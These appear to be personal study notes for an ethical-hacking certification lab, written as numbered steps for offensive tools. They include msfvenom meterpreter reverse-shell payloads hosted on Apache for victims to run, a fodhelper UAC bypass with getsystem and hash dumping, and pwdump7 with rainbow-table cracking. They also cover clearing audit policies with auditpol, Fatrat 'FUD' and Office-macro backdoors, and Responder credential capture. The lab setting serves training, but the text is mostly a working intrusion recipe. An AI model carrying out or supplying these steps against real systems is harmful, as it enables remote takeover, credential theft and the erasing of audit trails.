Tools Used 
1) **pwdump7.exe** this will show all the password hashes and password
	1) `pwdump7.exe > C:\hashes.txt`
2) Download ophcracl.exe load the hashes and choose vista free and complete the hashcracking
3) Tools to create for rainbow tables 
	1) winrtgen 
		1) click add table
		2) for hash select NTLM 
		3) Min length as 4 Max  length as 6 chain count as 400000
		4) charset lower alpha 

4) command for payload   `msfvenom -p windows/meterpreter/reverse_tcp  --platform windows -a x86 -f exe LHOST=kali_IP LPORT=listening_port -o /root/Desktop/Test.exe` 
5)  create a folder ` mkdir /var/www/html/share`  and then `chmod -R 755 /var/www/html/share` 

7) change the ownership of the folder to www-data by `chown -R www-data:www-data /var/html/share`
8) `cp /root/Desktop/Test.exe  /var/www/html/share` 
9) service apache2 start
10) msfconsole , use exploit/multi/handler,  set payload windows/meterpreter/reverse_tcp  , set lport to 4444 , run
11) Go to victim download and run and done 
12) in meterpreter shell type  `run vnc`



Escalating privs

1) On kali 
	1) `msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86/shikata_ga_nai -b "\x00" LHOST=victim_IP -f exe > Desktop/exploit.exe`
	2) repeat the steps 5 to 7 and replace Test.exe with exploit.exe 
	3) `ls -la /var/www/html/ | grep share`
	4) service apache2 start 
	5) repeat steps 10-11 and 
	6) shell background 
	7) use exploit/windows/local/bypassuac_fodhelper
	8) show options set payload w/m/r_tcp
	9) then getsystem 
	10) run post  windows/gather/smart_hashdump 






**Steganography**
Tools
1) Snow
	1) create a file readme.txt
	2) then using snow type 
		1) `snow -C "My swiss bank number is  34567" -p "magic" readme.txt readme2.txt ` here magic is the password 
	2) to read the file readme2.txt 
			1) `snow -C -p "magic" readme.txt `


2) **Openstego** 
 for hiding
	1) choose the file to be encrypted 
	2) choose the document to be encrypted in
	3) done
for extracting 
	1) choose the encrypted file choose the location done


3) **QuickStego** 
	1) for hiding again choose the image , choose the text file done
	2) for extracting just open the encrypted image


**Auditpol**
	1) in CMD type `auditool /get /category:*`
	2) To enable the audit policies type `auditpol /set /category:"system","account login" /success:enable /failure:enable` 
	3) to clear all the audit policies type the following command `auditpol /clear /y`


**CovertTCP**
1) in kali 
2) create folder in desktop 
3) type  `echo "Secret Messsage" > message.txt` 
4) go to files -> other locations -> in address field type `smb://IP/`
5) timming on youtube 1:50:00 -- 2:12:00
6)



**Fatrat**
1) choose 6 create a Fud  backdoor 1000% with pwnWinds 
2) the choose 3 exe with apache + powershell 
3) for LHOST type kali IP and LPORT 4444 
4) in base files enter payload 
5) choose `windows/meterpreter/reverse_tcp` 
6) press enter 2-3 times then press 8 to go to main menu 
7) choose 7 create backdoor with Ms office 
8) then choose 2 microsoft office macro on windows 
9) Set kali IP and port number 
10) for base name in output file type badDoc 
11) type y
12) in the Path /root/Fatrat/output/payload.exe 
13) choose payload as step 5
14) create /var/www/html/share then similar steps service apache2 start ................




**Responder**

1) responder -I eth0 
2) go the windows run `\\CEH-TOOLS` 




https://www.youtube.com/watch?v=m_EyLhcoDIE&list=PLrrgFyE6PtlaCixUxJPM0Y9Peye6iCewH&index=4